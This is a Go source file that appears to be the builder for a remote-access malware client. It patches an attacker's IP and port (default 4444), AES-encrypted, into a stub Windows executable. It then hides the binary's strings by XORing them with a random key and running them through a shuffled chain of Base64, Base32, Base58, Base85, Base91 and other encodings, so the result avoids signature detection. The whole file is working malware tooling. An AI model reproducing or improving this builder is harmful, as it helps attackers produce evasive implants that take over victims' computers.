package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/ascii85"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/eknkc/basex"
	"github.com/mr-tron/base58"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	args := flag.Args()
	if len(args) >= 1 {
		*ip = args[0]
	}
	if len(args) >= 2 {
		fmt.Sscanf(args[1], "%d", port)
	}

	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)

	stubPath := "stub.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
		stubPath = "client/client_c.exe"
		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
		}
	}

	data, err := ioutil.ReadFile(stubPath)
	if err != nil {
		log.Fatalf("[-] Error reading stub: %v", err)
	}

	var indices []int
	searchData := data
	offset := 0
	for {
		idx := bytes.Index(searchData, marker)
		if idx == -1 {
			break
		}
		indices = append(indices, offset+idx)
		searchData = searchData[idx+1:]
		offset += idx + 1
	}

	if len(indices) == 0 {
		log.Fatalf("[-] Error: Configuration marker (DEADBEEF...) not found in stub binary. Please make sure the client is compiled correctly with the resource.")
	}

	targetIndex := -1
	if len(indices) == 1 {
		targetIndex = indices[0]
		fmt.Printf("[+] Found configuration marker at 0x%X\n", targetIndex)
	} else {
		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
		maxZeros := -1
		for _, idx := range indices {
			scanLimit := 2032
			if idx+len(marker)+scanLimit > len(data) {
				scanLimit = len(data) - (idx + len(marker))
			}
			if scanLimit <= 0 {
				continue
			}

			zeros := 0
			for i := 0; i < scanLimit; i++ {
				if data[idx+len(marker)+i] == 0 {
					zeros++
				}
			}
			if zeros > maxZeros {
				maxZeros = zeros
				targetIndex = idx
			}
		}
	}

	capacity := 0
	for i := targetIndex + len(marker); i < len(data); i++ {
		if data[i] != 0 {
			break
		}
		capacity++
	}
	fmt.Printf("[+] Found resource placeholder at 0x%X (Capacity: %d bytes)\n", targetIndex, capacity)

	if targetIndex == -1 {
		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
	}

	config := Config{IP: *ip, Port: *port}
	configBytes, _ := json.Marshal(config)
	encryptedConfig := encrypt(configBytes)
	if len(encryptedConfig) > 2032 {
		log.Fatalf("[-] Error: Encrypted config too large.")
	}

	patchedData := make([]byte, len(data))
	copy(patchedData, data)
	finalPayload := make([]byte, 2032)
	copy(finalPayload, encryptedConfig)
	copy(patchedData[targetIndex+len(marker):], finalPayload)

	// --- Automated Obfuscation Logic ---
	rand.Seed(time.Now().UnixNano())
	xorKey := byte(rand.Intn(254) + 1)

	// Randomized encoding sequence IDs: 1:B64, 2:B32, 3:B16, 4:B58, 5:B62, 6:B85, 7:B91
	encSequence := []int{1, 2, 3, 4, 5, 6, 7}
	rand.Shuffle(len(encSequence), func(i, j int) {
		encSequence[i], encSequence[j] = encSequence[j], encSequence[i]
	})

	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
	keyIdx := bytes.Index(patchedData, xorKeyMarker)
	if keyIdx != -1 {
		patchedData[keyIdx+4] = xorKey
		for i, id := range encSequence {
			patchedData[keyIdx+5+i] = byte(id)
		}
		fmt.Printf("[+] Patched XOR key: 0x%02X, Sequence: %v\n", xorKey, encSequence)
	}

	type StringEntry struct {
		RVA            uint32
		OriginalLength uint32
		EncodedLength  uint32
		PoolOffset     uint32
	}
	var stringTable []StringEntry
	var stringPool []byte
	poolMap := make(map[string]uint32)

	f, err := pe.Open(stubPath)
	if err == nil {
		defer f.Close()
		var importRVA, importSize uint32
		if oh64, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
			importRVA = oh64.DataDirectory[1].VirtualAddress
			importSize = oh64.DataDirectory[1].Size
		} else if oh32, ok := f.OptionalHeader.(*pe.OptionalHeader32); ok {
			importRVA = oh32.DataDirectory[1].VirtualAddress
			importSize = oh32.DataDirectory[1].Size
		}

		for _, sec := range f.Sections {
			if strings.Contains(sec.Name, ".rdata") || strings.Contains(sec.Name, ".data") {
				fmt.Printf("[*] Scanning section %s for strings...\n", sec.Name)
				start := sec.Offset
				end := sec.Offset + sec.Size
				if end > uint32(len(patchedData)) {
					end = uint32(len(patchedData))
				}
				sectionData := patchedData[start:end]
				for i := 0; i < len(sectionData); {
					if isPrintable(sectionData[i]) {
						j := i
						for j < len(sectionData) && isPrintable(sectionData[j]) {
							j++
						}
						length := j - i
						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
							rva := sec.VirtualAddress + uint32(i)
							if (rva >= importRVA && rva < importRVA+importSize) ||
								(start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity)) {
								i = j + 1
								continue
							}

							strVal := string(sectionData[i:j])
							if bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker) ||
								strings.Contains(strVal, "BEGIN PUBLIC KEY") || strings.Contains(strVal, "END PUBLIC KEY") ||
								strings.Contains(strVal, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") || strings.Contains(strVal, "0123456789") ||
								strings.HasPrefix(strVal, ".") || // Skip section names (.text, .data, etc)
								isLikelyEncoded(strVal) {
								i = j + 1
								continue
							}

							originalStr := make([]byte, length)
							copy(originalStr, sectionData[i:j])
							for k := range originalStr {
								originalStr[k] ^= xorKey
							}

							encodedStr := string(originalStr)
							for _, id := range encSequence {
								switch id {
								case 1: encodedStr = encodeBase64([]byte(encodedStr))
								case 2: encodedStr = encodeBase32([]byte(encodedStr))
								case 3: encodedStr = encodeBase16([]byte(encodedStr))
								case 4: encodedStr = encodeBase58([]byte(encodedStr))
								case 5: encodedStr = encodeBase62([]byte(encodedStr))
								case 6: encodedStr = encodeBase85([]byte(encodedStr))
								case 7: encodedStr = encodeBase91([]byte(encodedStr))
								}
							}

							poolOffset, exists := poolMap[encodedStr]
							if !exists {
								poolOffset = uint32(len(stringPool))
								stringPool = append(stringPool, []byte(encodedStr)...)
								stringPool = append(stringPool, 0)
								poolMap[encodedStr] = poolOffset
							}

							stringTable = append(stringTable, StringEntry{
								RVA:            rva,
								OriginalLength: uint32(length),
								EncodedLength:  uint32(len(encodedStr)),
								PoolOffset:     poolOffset,
							})

							for k := 0; k < length; k++ {
								patchedData[start+uint32(i)+uint32(k)] = 0
							}
							i = j + 1
						} else { i++ }
					} else { i++ }
				}
			}
		}
	}

	tableStart := targetIndex + len(marker) + 2032
	tableSize := 4 + len(stringTable)*16
	totalSize := tableSize + len(stringPool)

	if tableStart+totalSize <= targetIndex+len(marker)+capacity {
		binary.LittleEndian.PutUint32(patchedData[tableStart:tableStart+4], uint32(len(stringTable)))
		for i, entry := range stringTable {
			entryOffset := tableStart + 4 + i*16
			binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
			binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.OriginalLength)
			binary.LittleEndian.PutUint32(patchedData[entryOffset+8:entryOffset+12], entry.EncodedLength)
			binary.LittleEndian.PutUint32(patchedData[entryOffset+12:entryOffset+16], entry.PoolOffset)
		}
		copy(patchedData[tableStart+tableSize:], stringPool)
		fmt.Printf("[+] Wrote string table (%d entries) and pool (%d bytes)\n", len(stringTable), len(stringPool))
	} else {
		log.Fatalf("[-] Error: String table and pool too large.")
	}

	ioutil.WriteFile("client.exe", patchedData, 0755)
	fmt.Println("[+] Successfully built client.exe")
}

func isPrintable(b byte) bool {
	return b >= 32 && b <= 126
}

func isLikelyEncoded(s string) bool {
	if len(s) < 16 { return false }
	b64Chars := 0
	for _, c := range s {
		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' {
			b64Chars++
		}
	}
	return float64(b64Chars)/float64(len(s)) > 0.9
}

func encodeBase16(data []byte) string { return hex.EncodeToString(data) }
func encodeBase32(data []byte) string { return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data) }
func encodeBase64(data []byte) string { return base64.StdEncoding.EncodeToString(data) }
func encodeBase58(data []byte) string { return base58.Encode(data) }
func encodeBase62(data []byte) string {
	b62, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
	return b62.Encode(data)
}
func encodeBase85(data []byte) string {
	dest := make([]byte, ascii85.MaxEncodedLen(len(data)))
	n := ascii85.Encode(dest, data)
	return string(dest[:n])
}
func encodeBase91(data []byte) string {
	var lookup = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\""
	var out strings.Builder
	var n, b uint32
	for _, v := range data {
		b |= uint32(v) << n
		n += 8
		if n > 13 {
			v := b & 8191
			if v > 88 { b >>= 13; n -= 13 } else { v = b & 16383; b >>= 14; n -= 14 }
			out.WriteByte(lookup[v%91]); out.WriteByte(lookup[v/91])
		}
	}
	if n > 0 {
		out.WriteByte(lookup[b%91])
		if n > 7 || b > 90 { out.WriteByte(lookup[b/91]) }
	}
	return out.String()
}

func encrypt(plaintext []byte) []byte {
	block, _ := aes.NewCipher([]byte(ConfigKey))
	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	plaintext = append(plaintext, bytes.Repeat([]byte{0}, padding)...)
	ciphertext := make([]byte, len(plaintext))
	cipher.NewCBCEncrypter(block, []byte(ConfigIV)).CryptBlocks(ciphertext, plaintext)
	return ciphertext
}
